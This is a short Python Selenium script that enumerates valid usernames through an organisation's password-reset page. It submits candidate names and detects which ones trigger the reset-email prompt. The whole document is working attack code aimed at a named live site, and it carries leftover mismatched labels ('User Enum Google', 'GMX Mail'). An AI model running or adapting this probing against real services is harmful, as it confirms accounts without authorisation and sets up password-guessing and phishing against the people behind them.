#  User Enum Google

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

driver = webdriver.Edge(executable_path='msedgedriver')

print("The usernames present in GMX Mail are:")

#for i in ["superman", "BegForMercy", "BraiasjdnkjnAxe", "CrazyMind", "DeathWaasdaish", "DisasterMaster", "ElNaaaino", "EndlessFacepalms", "FreakingOblin", "GhostlyPresence", "GridlockAndKey", "HoofHearted666", "KungFuMonk", "NineTees", "PlzJustDie", "SeekNDestroy", "SinisterChill", "BegqwForMercy", "BasxasdxrainAxe", "Crazy1Mind", "DeatasdasdhWish", "Dis1asterMaster", "EaslNino", "EndlessFaaacepalms", "FrrreakingOblin", "GhossdtlyPreseasnce", "GrisadlockAndKey", "HoofaHearted666", "KsungFuMonk", "NinessTees", "sPlzJustDie", "sSeeksNDestroy", "SssinisddterChill"]:
for i in ["reddy.s", "reddy.a", "kumar.a", "alice.c"]:
    user = i

    driver.get("https://nu.outsystemsenterprise.com/PasswordManagement/")
    sleep(3)
    p1=driver.page_source
    elem=driver.find_element_by_xpath('//input[@type="text"]') #type = 'text'/'email'
    #elem=driver.find_element_by_id("login")
    elem.send_keys(user)
    elem.send_keys(Keys.RETURN)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)
    if "Please select the email address where you wish to receive the password reset link" in p3:
    #if "This username isn't allowed. Try again." in p1:
       print(i)





